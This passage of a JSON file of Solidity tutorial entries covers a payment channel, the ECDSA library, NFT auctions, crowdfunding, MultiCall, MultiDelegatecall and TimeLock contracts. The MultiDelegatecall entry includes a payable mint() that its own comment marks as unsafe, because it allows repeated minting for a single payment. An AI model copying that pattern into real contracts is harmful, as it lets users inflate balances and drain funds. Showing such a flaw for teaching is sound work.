onlyUser\n        checkSignatures(_signatures, _balances, _nonce)\n        checkBalances(_balances)\n    {\n        require(block.timestamp < expiresAt, \"Expired challenge period\");\n        require(_nonce > nonce, \"Nonce must be greater than the current nonce\");\n\n        for (uint256 i = 0; i < _balances.length; i++) {\n            balances[users[i]] = _balances[i];\n        }\n\n        nonce = _nonce;\n        expiresAt = block.timestamp + challengePeriod;\n\n        emit ChallengeExit(msg.sender, nonce);\n    }\n\n    function withdraw() public onlyUser {\n        require(\n            block.timestamp >= expiresAt, \"Challenge period has not expired yet\"\n        );\n\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        emit Withdraw(msg.sender, amount);\n    }\n}\n"
      },
      {
        "fileName": "ECDSA.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/cryptography/ECDSA.sol)\n\nlibrary ECDSA {\n    enum RecoverError {\n        NoError,\n        InvalidSignature,\n        InvalidSignatureLength,\n        InvalidSignatureS,\n        InvalidSignatureV\n    }\n\n    function _throwError(RecoverError error) private pure {\n        if (error == RecoverError.NoError) {\n            return; // no error: do nothing\n        } else if (error == RecoverError.InvalidSignature) {\n            revert(\"ECDSA: invalid signature\");\n        } else if (error == RecoverError.InvalidSignatureLength) {\n            revert(\"ECDSA: invalid signature length\");\n        } else if (error == RecoverError.InvalidSignatureS) {\n            revert(\"ECDSA: invalid signature 's' value\");\n        } else if (error == RecoverError.InvalidSignatureV) {\n            revert(\"ECDSA: invalid signature 'v' value\");\n        }\n    }\n\n    function tryRecover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // Check the signature length\n        // - case 65: r,s,v signature (standard)\n        // - case 64: r,vs signature (cf https://eips.ethereum.org/EIPS/eip-2098) _Available since v4.1._\n        if (signature.length == 65) {\n            bytes32 r;\n            bytes32 s;\n            uint8 v;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                s := mload(add(signature, 0x40))\n                v := byte(0, mload(add(signature, 0x60)))\n            }\n            return tryRecover(hash, v, r, s);\n        } else if (signature.length == 64) {\n            bytes32 r;\n            bytes32 vs;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                vs := mload(add(signature, 0x40))\n            }\n            return tryRecover(hash, r, vs);\n        } else {\n            return (address(0), RecoverError.InvalidSignatureLength);\n        }\n    }\n\n    function recover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, signature);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        bytes32 s = vs\n            & bytes32(\n                0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n            );\n        uint8 v = uint8((uint256(vs) >> 255) + 27);\n        return tryRecover(hash, v, r, s);\n    }\n\n    function recover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, r, vs);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (\n            uint256(s)\n                > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0\n        ) {\n            return (address(0), RecoverError.InvalidSignatureS);\n        }\n        if (v != 27 && v != 28) {\n            return (address(0), RecoverError.InvalidSignatureV);\n        }\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(hash, v, r, s);\n        if (signer == address(0)) {\n            return (address(0), RecoverError.InvalidSignature);\n        }\n\n        return (signer, RecoverError.NoError);\n    }\n\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);\n        _throwError(error);\n        return recovered;\n    }\n\n    function toEthSignedMessageHash(bytes32 hash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        // 32 is the length in bytes of hash,\n        // enforced by the type signature above\n        return keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "bi-directional",
      "payment",
      "channel",
      "signature",
      "cryptography"
    ],
    "order": 15
  },
  {
    "slug": "english-auction",
    "title": "English Auction",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "An example of English auction in Solidity",
    "content": "English auction for NFT.\n\n### Auction\n\n1. Seller of NFT deploys this contract.\n2. Auction lasts for 7 days.\n3. Participants can bid by depositing ETH greater than the current highest bidder.\n4. All bidders can withdraw their bid if it is not the current highest bid.\n\n### After the auction\n\n1. Highest bidder becomes the new owner of NFT.\n2. The seller receives the highest bid of ETH.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC721 {\n    function safeTransferFrom(address from, address to, uint256 tokenId)\n        external;\n    function transferFrom(address, address, uint256) external;\n}\n\ncontract EnglishAuction {\n    event Start();\n    event Bid(address indexed sender, uint256 amount);\n    event Withdraw(address indexed bidder, uint256 amount);\n    event End(address winner, uint256 amount);\n\n    IERC721 public nft;\n    uint256 public nftId;\n\n    address payable public seller;\n    uint256 public endAt;\n    bool public started;\n    bool public ended;\n\n    address public highestBidder;\n    uint256 public highestBid;\n    mapping(address => uint256) public bids;\n\n    constructor(address _nft, uint256 _nftId, uint256 _startingBid) {\n        nft = IERC721(_nft);\n        nftId = _nftId;\n\n        seller = payable(msg.sender);\n        highestBid = _startingBid;\n    }\n\n    function start() external {\n        require(!started, \"started\");\n        require(msg.sender == seller, \"not seller\");\n\n        nft.transferFrom(msg.sender, address(this), nftId);\n        started = true;\n        endAt = block.timestamp + 7 days;\n\n        emit Start();\n    }\n\n    function bid() external payable {\n        require(started, \"not started\");\n        require(block.timestamp < endAt, \"ended\");\n        require(msg.value > highestBid, \"value < highest\");\n\n        if (highestBidder != address(0)) {\n            bids[highestBidder] += highestBid;\n        }\n\n        highestBidder = msg.sender;\n        highestBid = msg.value;\n\n        emit Bid(msg.sender, msg.value);\n    }\n\n    function withdraw() external {\n        uint256 bal = bids[msg.sender];\n        bids[msg.sender] = 0;\n        payable(msg.sender).transfer(bal);\n\n        emit Withdraw(msg.sender, bal);\n    }\n\n    function end() external {\n        require(started, \"not started\");\n        require(block.timestamp >= endAt, \"not ended\");\n        require(!ended, \"ended\");\n\n        ended = true;\n        if (highestBidder != address(0)) {\n            nft.safeTransferFrom(address(this), highestBidder, nftId);\n            seller.transfer(highestBid);\n        } else {\n            nft.safeTransferFrom(address(this), seller, nftId);\n        }\n\n        emit End(highestBidder, highestBid);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "EnglishAuction.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC721 {\n    function safeTransferFrom(address from, address to, uint256 tokenId)\n        external;\n    function transferFrom(address, address, uint256) external;\n}\n\ncontract EnglishAuction {\n    event Start();\n    event Bid(address indexed sender, uint256 amount);\n    event Withdraw(address indexed bidder, uint256 amount);\n    event End(address winner, uint256 amount);\n\n    IERC721 public nft;\n    uint256 public nftId;\n\n    address payable public seller;\n    uint256 public endAt;\n    bool public started;\n    bool public ended;\n\n    address public highestBidder;\n    uint256 public highestBid;\n    mapping(address => uint256) public bids;\n\n    constructor(address _nft, uint256 _nftId, uint256 _startingBid) {\n        nft = IERC721(_nft);\n        nftId = _nftId;\n\n        seller = payable(msg.sender);\n        highestBid = _startingBid;\n    }\n\n    function start() external {\n        require(!started, \"started\");\n        require(msg.sender == seller, \"not seller\");\n\n        nft.transferFrom(msg.sender, address(this), nftId);\n        started = true;\n        endAt = block.timestamp + 7 days;\n\n        emit Start();\n    }\n\n    function bid() external payable {\n        require(started, \"not started\");\n        require(block.timestamp < endAt, \"ended\");\n        require(msg.value > highestBid, \"value < highest\");\n\n        if (highestBidder != address(0)) {\n            bids[highestBidder] += highestBid;\n        }\n\n        highestBidder = msg.sender;\n        highestBid = msg.value;\n\n        emit Bid(msg.sender, msg.value);\n    }\n\n    function withdraw() external {\n        uint256 bal = bids[msg.sender];\n        bids[msg.sender] = 0;\n        payable(msg.sender).transfer(bal);\n\n        emit Withdraw(msg.sender, bal);\n    }\n\n    function end() external {\n        require(started, \"not started\");\n        require(block.timestamp >= endAt, \"not ended\");\n        require(!ended, \"ended\");\n\n        ended = true;\n        if (highestBidder != address(0)) {\n            nft.safeTransferFrom(address(this), highestBidder, nftId);\n            seller.transfer(highestBid);\n        } else {\n            nft.safeTransferFrom(address(this), seller, nftId);\n        }\n\n        emit End(highestBidder, highestBid);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "english",
      "auction",
      "auctions"
    ],
    "order": 16
  },
  {
    "slug": "dutch-auction",
    "title": "Dutch Auction",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "An example of Dutch auction in Solidity",
    "content": "Dutch auction for NFT.\n\n### Auction\n\n1. Seller of NFT deploys this contract setting a starting price for the NFT.\n2. Auction lasts for 7 days.\n3. Price of NFT decreases over time.\n4. Participants can buy by depositing ETH greater than the current price computed by the smart contract.\n5. Auction ends when a buyer buys the NFT.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC721 {\n    function transferFrom(address _from, address _to, uint256 _nftId)\n        external;\n}\n\ncontract DutchAuction {\n    uint256 private constant DURATION = 7 days;\n\n    IERC721 public immutable nft;\n    uint256 public immutable nftId;\n\n    address payable public immutable seller;\n    uint256 public immutable startingPrice;\n    uint256 public immutable startAt;\n    uint256 public immutable expiresAt;\n    uint256 public immutable discountRate;\n\n    constructor(\n        uint256 _startingPrice,\n        uint256 _discountRate,\n        address _nft,\n        uint256 _nftId\n    ) {\n        seller = payable(msg.sender);\n        startingPrice = _startingPrice;\n        startAt = block.timestamp;\n        expiresAt = block.timestamp + DURATION;\n        discountRate = _discountRate;\n\n        require(\n            _startingPrice >= _discountRate * DURATION, \"starting price < min\"\n        );\n\n        nft = IERC721(_nft);\n        nftId = _nftId;\n    }\n\n    function getPrice() public view returns (uint256) {\n        uint256 timeElapsed = block.timestamp - startAt;\n        uint256 discount = discountRate * timeElapsed;\n        return startingPrice - discount;\n    }\n\n    function buy() external payable {\n        require(block.timestamp < expiresAt, \"auction expired\");\n\n        uint256 price = getPrice();\n        require(msg.value >= price, \"ETH < price\");\n\n        nft.transferFrom(seller, msg.sender, nftId);\n        uint256 refund = msg.value - price;\n        if (refund > 0) {\n            payable(msg.sender).transfer(refund);\n        }\n        selfdestruct(seller);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "DutchAuction.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC721 {\n    function transferFrom(address _from, address _to, uint256 _nftId)\n        external;\n}\n\ncontract DutchAuction {\n    uint256 private constant DURATION = 7 days;\n\n    IERC721 public immutable nft;\n    uint256 public immutable nftId;\n\n    address payable public immutable seller;\n    uint256 public immutable startingPrice;\n    uint256 public immutable startAt;\n    uint256 public immutable expiresAt;\n    uint256 public immutable discountRate;\n\n    constructor(\n        uint256 _startingPrice,\n        uint256 _discountRate,\n        address _nft,\n        uint256 _nftId\n    ) {\n        seller = payable(msg.sender);\n        startingPrice = _startingPrice;\n        startAt = block.timestamp;\n        expiresAt = block.timestamp + DURATION;\n        discountRate = _discountRate;\n\n        require(\n            _startingPrice >= _discountRate * DURATION, \"starting price < min\"\n        );\n\n        nft = IERC721(_nft);\n        nftId = _nftId;\n    }\n\n    function getPrice() public view returns (uint256) {\n        uint256 timeElapsed = block.timestamp - startAt;\n        uint256 discount = discountRate * timeElapsed;\n        return startingPrice - discount;\n    }\n\n    function buy() external payable {\n        require(block.timestamp < expiresAt, \"auction expired\");\n\n        uint256 price = getPrice();\n        require(msg.value >= price, \"ETH < price\");\n\n        nft.transferFrom(seller, msg.sender, nftId);\n        uint256 refund = msg.value - price;\n        if (refund > 0) {\n            payable(msg.sender).transfer(refund);\n        }\n        selfdestruct(seller);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "dutch",
      "auction",
      "auctions"
    ],
    "order": 17
  },
  {
    "slug": "crowd-fund",
    "title": "Crowd Fund",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "An example of crowdfunding contract",
    "content": "Crowd fund ERC20 token\n\n1. User creates a campaign.\n2. Users can pledge, transferring their token to a campaign.\n3. After the campaign ends, campaign creator can claim the funds if total amount pledged is more than the campaign goal.\n4. Otherwise, campaign did not reach its goal, users can withdraw their pledge.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function transfer(address, uint256) external returns (bool);\n    function transferFrom(address, address, uint256) external returns (bool);\n}\n\ncontract CrowdFund {\n    event Launch(\n        uint256 id,\n        address indexed creator,\n        uint256 goal,\n        uint32 startAt,\n        uint32 endAt\n    );\n    event Cancel(uint256 id);\n    event Pledge(uint256 indexed id, address indexed caller, uint256 amount);\n    event Unpledge(uint256 indexed id, address indexed caller, uint256 amount);\n    event Claim(uint256 id);\n    event Refund(uint256 id, address indexed caller, uint256 amount);\n\n    struct Campaign {\n        // Creator of campaign\n        address creator;\n        // Amount of tokens to raise\n        uint256 goal;\n        // Total amount pledged\n        uint256 pledged;\n        // Timestamp of start of campaign\n        uint32 startAt;\n        // Timestamp of end of campaign\n        uint32 endAt;\n        // True if goal was reached and creator has claimed the tokens.\n        bool claimed;\n    }\n\n    IERC20 public immutable token;\n    // Total count of campaigns created.\n    // It is also used to generate id for new campaigns.\n    uint256 public count;\n    // Mapping from id to Campaign\n    mapping(uint256 => Campaign) public campaigns;\n    // Mapping from campaign id => pledger => amount pledged\n    mapping(uint256 => mapping(address => uint256)) public pledgedAmount;\n\n    constructor(address _token) {\n        token = IERC20(_token);\n    }\n\n    function launch(uint256 _goal, uint32 _startAt, uint32 _endAt) external {\n        require(_startAt >= block.timestamp, \"start at < now\");\n        require(_endAt >= _startAt, \"end at < start at\");\n        require(_endAt <= block.timestamp + 90 days, \"end at > max duration\");\n\n        count += 1;\n        campaigns[count] = Campaign({\n            creator: msg.sender,\n            goal: _goal,\n            pledged: 0,\n            startAt: _startAt,\n            endAt: _endAt,\n            claimed: false\n        });\n\n        emit Launch(count, msg.sender, _goal, _startAt, _endAt);\n    }\n\n    function cancel(uint256 _id) external {\n        Campaign memory campaign = campaigns[_id];\n        require(campaign.creator == msg.sender, \"not creator\");\n        require(block.timestamp < campaign.startAt, \"started\");\n\n        delete campaigns[_id];\n        emit Cancel(_id);\n    }\n\n    function pledge(uint256 _id, uint256 _amount) external {\n        Campaign storage campaign = campaigns[_id];\n        require(block.timestamp >= campaign.startAt, \"not started\");\n        require(block.timestamp <= campaign.endAt, \"ended\");\n\n        campaign.pledged += _amount;\n        pledgedAmount[_id][msg.sender] += _amount;\n        token.transferFrom(msg.sender, address(this), _amount);\n\n        emit Pledge(_id, msg.sender, _amount);\n    }\n\n    function unpledge(uint256 _id, uint256 _amount) external {\n        Campaign storage campaign = campaigns[_id];\n        require(block.timestamp <= campaign.endAt, \"ended\");\n\n        campaign.pledged -= _amount;\n        pledgedAmount[_id][msg.sender] -= _amount;\n        token.transfer(msg.sender, _amount);\n\n        emit Unpledge(_id, msg.sender, _amount);\n    }\n\n    function claim(uint256 _id) external {\n        Campaign storage campaign = campaigns[_id];\n        require(campaign.creator == msg.sender, \"not creator\");\n        require(block.timestamp > campaign.endAt, \"not ended\");\n        require(campaign.pledged >= campaign.goal, \"pledged < goal\");\n        require(!campaign.claimed, \"claimed\");\n\n        campaign.claimed = true;\n        token.transfer(campaign.creator, campaign.pledged);\n\n        emit Claim(_id);\n    }\n\n    function refund(uint256 _id) external {\n        Campaign memory campaign = campaigns[_id];\n        require(block.timestamp > campaign.endAt, \"not ended\");\n        require(campaign.pledged < campaign.goal, \"pledged >= goal\");\n\n        uint256 bal = pledgedAmount[_id][msg.sender];\n        pledgedAmount[_id][msg.sender] = 0;\n        token.transfer(msg.sender, bal);\n\n        emit Refund(_id, msg.sender, bal);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "CrowdFund.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function transfer(address, uint256) external returns (bool);\n    function transferFrom(address, address, uint256) external returns (bool);\n}\n\ncontract CrowdFund {\n    event Launch(\n        uint256 id,\n        address indexed creator,\n        uint256 goal,\n        uint32 startAt,\n        uint32 endAt\n    );\n    event Cancel(uint256 id);\n    event Pledge(uint256 indexed id, address indexed caller, uint256 amount);\n    event Unpledge(uint256 indexed id, address indexed caller, uint256 amount);\n    event Claim(uint256 id);\n    event Refund(uint256 id, address indexed caller, uint256 amount);\n\n    struct Campaign {\n        // Creator of campaign\n        address creator;\n        // Amount of tokens to raise\n        uint256 goal;\n        // Total amount pledged\n        uint256 pledged;\n        // Timestamp of start of campaign\n        uint32 startAt;\n        // Timestamp of end of campaign\n        uint32 endAt;\n        // True if goal was reached and creator has claimed the tokens.\n        bool claimed;\n    }\n\n    IERC20 public immutable token;\n    // Total count of campaigns created.\n    // It is also used to generate id for new campaigns.\n    uint256 public count;\n    // Mapping from id to Campaign\n    mapping(uint256 => Campaign) public campaigns;\n    // Mapping from campaign id => pledger => amount pledged\n    mapping(uint256 => mapping(address => uint256)) public pledgedAmount;\n\n    constructor(address _token) {\n        token = IERC20(_token);\n    }\n\n    function launch(uint256 _goal, uint32 _startAt, uint32 _endAt) external {\n        require(_startAt >= block.timestamp, \"start at < now\");\n        require(_endAt >= _startAt, \"end at < start at\");\n        require(_endAt <= block.timestamp + 90 days, \"end at > max duration\");\n\n        count += 1;\n        campaigns[count] = Campaign({\n            creator: msg.sender,\n            goal: _goal,\n            pledged: 0,\n            startAt: _startAt,\n            endAt: _endAt,\n            claimed: false\n        });\n\n        emit Launch(count, msg.sender, _goal, _startAt, _endAt);\n    }\n\n    function cancel(uint256 _id) external {\n        Campaign memory campaign = campaigns[_id];\n        require(campaign.creator == msg.sender, \"not creator\");\n        require(block.timestamp < campaign.startAt, \"started\");\n\n        delete campaigns[_id];\n        emit Cancel(_id);\n    }\n\n    function pledge(uint256 _id, uint256 _amount) external {\n        Campaign storage campaign = campaigns[_id];\n        require(block.timestamp >= campaign.startAt, \"not started\");\n        require(block.timestamp <= campaign.endAt, \"ended\");\n\n        campaign.pledged += _amount;\n        pledgedAmount[_id][msg.sender] += _amount;\n        token.transferFrom(msg.sender, address(this), _amount);\n\n        emit Pledge(_id, msg.sender, _amount);\n    }\n\n    function unpledge(uint256 _id, uint256 _amount) external {\n        Campaign storage campaign = campaigns[_id];\n        require(block.timestamp <= campaign.endAt, \"ended\");\n\n        campaign.pledged -= _amount;\n        pledgedAmount[_id][msg.sender] -= _amount;\n        token.transfer(msg.sender, _amount);\n\n        emit Unpledge(_id, msg.sender, _amount);\n    }\n\n    function claim(uint256 _id) external {\n        Campaign storage campaign = campaigns[_id];\n        require(campaign.creator == msg.sender, \"not creator\");\n        require(block.timestamp > campaign.endAt, \"not ended\");\n        require(campaign.pledged >= campaign.goal, \"pledged < goal\");\n        require(!campaign.claimed, \"claimed\");\n\n        campaign.claimed = true;\n        token.transfer(campaign.creator, campaign.pledged);\n\n        emit Claim(_id);\n    }\n\n    function refund(uint256 _id) external {\n        Campaign memory campaign = campaigns[_id];\n        require(block.timestamp > campaign.endAt, \"not ended\");\n        require(campaign.pledged < campaign.goal, \"pledged >= goal\");\n\n        uint256 bal = pledgedAmount[_id][msg.sender];\n        pledgedAmount[_id][msg.sender] = 0;\n        token.transfer(msg.sender, bal);\n\n        emit Refund(_id, msg.sender, bal);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "crowd",
      "fund",
      "funding"
    ],
    "order": 18
  },
  {
    "slug": "multi-call",
    "title": "Multi Call",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "An example of contract to aggregate multiple calls.",
    "content": "An example of contract that aggregates multiple queries using a `for` loop and `staticcall`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MultiCall {\n    function multiCall(address[] calldata targets, bytes[] calldata data)\n        external\n        view\n        returns (bytes[] memory)\n    {\n        require(targets.length == data.length, \"target length != data length\");\n\n        bytes[] memory results = new bytes[](data.length);\n\n        for (uint256 i; i < targets.length; i++) {\n            (bool success, bytes memory result) = targets[i].staticcall(data[i]);\n            require(success, \"call failed\");\n            results[i] = result;\n        }\n\n        return results;\n    }\n}\n\n```\n\nContract to test `MultiCall`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract TestMultiCall {\n    function test(uint256 _i) external pure returns (uint256) {\n        return _i;\n    }\n\n    function getData(uint256 _i) external pure returns (bytes memory) {\n        return abi.encodeWithSelector(this.test.selector, _i);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "MultiCall.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MultiCall {\n    function multiCall(address[] calldata targets, bytes[] calldata data)\n        external\n        view\n        returns (bytes[] memory)\n    {\n        require(targets.length == data.length, \"target length != data length\");\n\n        bytes[] memory results = new bytes[](data.length);\n\n        for (uint256 i; i < targets.length; i++) {\n            (bool success, bytes memory result) = targets[i].staticcall(data[i]);\n            require(success, \"call failed\");\n            results[i] = result;\n        }\n\n        return results;\n    }\n}\n"
      },
      {
        "fileName": "TestMultiCall.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract TestMultiCall {\n    function test(uint256 _i) external pure returns (uint256) {\n        return _i;\n    }\n\n    function getData(uint256 _i) external pure returns (bytes memory) {\n        return abi.encodeWithSelector(this.test.selector, _i);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "multi",
      "call",
      "staticcall"
    ],
    "order": 19
  },
  {
    "slug": "multi-delegatecall",
    "title": "Multi Delegatecall",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "An example of contract to call multiple functions in a single transaction",
    "content": "An example of calling multiple functions with a single transaction, using `delegatecall`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MultiDelegatecall {\n    error DelegatecallFailed();\n\n    function multiDelegatecall(bytes[] memory data)\n        external\n        payable\n        returns (bytes[] memory results)\n    {\n        results = new bytes[](data.length);\n\n        for (uint256 i; i < data.length; i++) {\n            (bool ok, bytes memory res) = address(this).delegatecall(data[i]);\n            if (!ok) {\n                revert DelegatecallFailed();\n            }\n            results[i] = res;\n        }\n    }\n}\n\n// Why use multi delegatecall? Why not multi call?\n// alice -> multi call --- call ---> test (msg.sender = multi call)\n// alice -> test --- delegatecall ---> test (msg.sender = alice)\ncontract TestMultiDelegatecall is MultiDelegatecall {\n    event Log(address caller, string func, uint256 i);\n\n    function func1(uint256 x, uint256 y) external {\n        // msg.sender = alice\n        emit Log(msg.sender, \"func1\", x + y);\n    }\n\n    function func2() external returns (uint256) {\n        // msg.sender = alice\n        emit Log(msg.sender, \"func2\", 2);\n        return 111;\n    }\n\n    mapping(address => uint256) public balanceOf;\n\n    // WARNING: unsafe code when used in combination with multi-delegatecall\n    // user can mint multiple times for the price of msg.value\n    function mint() external payable {\n        balanceOf[msg.sender] += msg.value;\n    }\n}\n\ncontract Helper {\n    function getFunc1Data(uint256 x, uint256 y)\n        external\n        pure\n        returns (bytes memory)\n    {\n        return\n            abi.encodeWithSelector(TestMultiDelegatecall.func1.selector, x, y);\n    }\n\n    function getFunc2Data() external pure returns (bytes memory) {\n        return abi.encodeWithSelector(TestMultiDelegatecall.func2.selector);\n    }\n\n    function getMintData() external pure returns (bytes memory) {\n        return abi.encodeWithSelector(TestMultiDelegatecall.mint.selector);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "MultiDelegatecall.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MultiDelegatecall {\n    error DelegatecallFailed();\n\n    function multiDelegatecall(bytes[] memory data)\n        external\n        payable\n        returns (bytes[] memory results)\n    {\n        results = new bytes[](data.length);\n\n        for (uint256 i; i < data.length; i++) {\n            (bool ok, bytes memory res) = address(this).delegatecall(data[i]);\n            if (!ok) {\n                revert DelegatecallFailed();\n            }\n            results[i] = res;\n        }\n    }\n}\n\n// Why use multi delegatecall? Why not multi call?\n// alice -> multi call --- call ---> test (msg.sender = multi call)\n// alice -> test --- delegatecall ---> test (msg.sender = alice)\ncontract TestMultiDelegatecall is MultiDelegatecall {\n    event Log(address caller, string func, uint256 i);\n\n    function func1(uint256 x, uint256 y) external {\n        // msg.sender = alice\n        emit Log(msg.sender, \"func1\", x + y);\n    }\n\n    function func2() external returns (uint256) {\n        // msg.sender = alice\n        emit Log(msg.sender, \"func2\", 2);\n        return 111;\n    }\n\n    mapping(address => uint256) public balanceOf;\n\n    // WARNING: unsafe code when used in combination with multi-delegatecall\n    // user can mint multiple times for the price of msg.value\n    function mint() external payable {\n        balanceOf[msg.sender] += msg.value;\n    }\n}\n\ncontract Helper {\n    function getFunc1Data(uint256 x, uint256 y)\n        external\n        pure\n        returns (bytes memory)\n    {\n        return\n            abi.encodeWithSelector(TestMultiDelegatecall.func1.selector, x, y);\n    }\n\n    function getFunc2Data() external pure returns (bytes memory) {\n        return abi.encodeWithSelector(TestMultiDelegatecall.func2.selector);\n    }\n\n    function getMintData() external pure returns (bytes memory) {\n        return abi.encodeWithSelector(TestMultiDelegatecall.mint.selector);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "multi",
      "delegatecall"
    ],
    "order": 20
  },
  {
    "slug": "time-lock",
    "title": "Time Lock",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Time Lock",
    "content": "`TimeLock` is a contract that publishes a transaction to be executed in the future.\nAfter a minimum waiting period, the transaction can be executed.\n\n`TimeLock`s are commonly used in DAOs.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract TimeLock {\n    error NotOwnerError();\n    error AlreadyQueuedError(bytes32 txId);\n    error TimestampNotInRangeError(uint256 blockTimestamp, uint256 timestamp);\n    error NotQueuedError(bytes32 txId);\n    error TimestampNotPassedError(uint256 blockTimestamp, uint256 timestamp);\n    error TimestampExpiredError(uint256 blockTimestamp, uint256 expiresAt);\n    error TxFailedError();\n\n    event Queue(\n        bytes32 indexed txId,\n        address indexed target,\n        uint256 value,\n        string func,\n        bytes data,\n        uint256 timestamp\n    );\n    event Execute(\n        bytes32 indexed txId,\n        address indexed target,\n        uint256 value,\n        string func,\n        bytes data,\n        uint256 timestamp\n    );\n    event Cancel(bytes32 indexed txId);\n\n    uint256 public constant MIN_DELAY = 10; // seconds\n    uint256 public constant MAX_DELAY = 1000; // seconds\n    uint256 public constant GRACE_PERIOD = 1000; // seconds\n\n    address public owner;\n    // tx id => queued\n    mapping(bytes32 => bool) public queued;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        if (msg.sender != owner) {\n            revert NotOwnerError();\n        }\n        _;\n    }\n\n    receive() external payable {}\n\n    function getTxId(\n        address _target,\n        uint256 _value,\n        string calldata _func,\n        bytes calldata _data,\n        uint256 _timestamp\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encode(_target, _value, _func, _data, _timestamp));\n    }\n\n    /**\n     * @param _target Address of contract or account to call\n     * @param _value Amount of ETH to send\n     * @param _func Function signature, for example \"foo(address,uint256)\"\n     * @param _data ABI encoded data send.\n     * @param _timestamp Timestamp after which the transaction can be executed.\n     */\n    function queue(\n        address _target,\n        uint256 _value,\n        string calldata _func,\n        bytes calldata _data,\n        uint256 _timestamp\n    ) external onlyOwner returns (bytes32 txId) {\n        txId = getTxId(_target, _value, _func, _data, _timestamp);\n        if (queued[txId]) {\n            revert AlreadyQueuedError(txId);\n        }\n        // ---|------------|---------------|-------\n        //  block    block + min     block + max\n        if (\n            _timestamp < block.timestamp + MIN_DELAY\n                || _timestamp > block.timestamp + MAX_DELAY\n        ) {\n            revert TimestampNotInRangeError(block.timestamp, _timestamp);\n        }\n\n        queued[txId] = true;\n\n        emit Queue(txId, _target, _value, _func, _data, _timestamp);\n    }\n\n    function execute(\n        address _target,\n        uint256 _value,\n        string calldata _func,\n        bytes calldata _data,\n        uint256 _timestamp\n    ) external payable 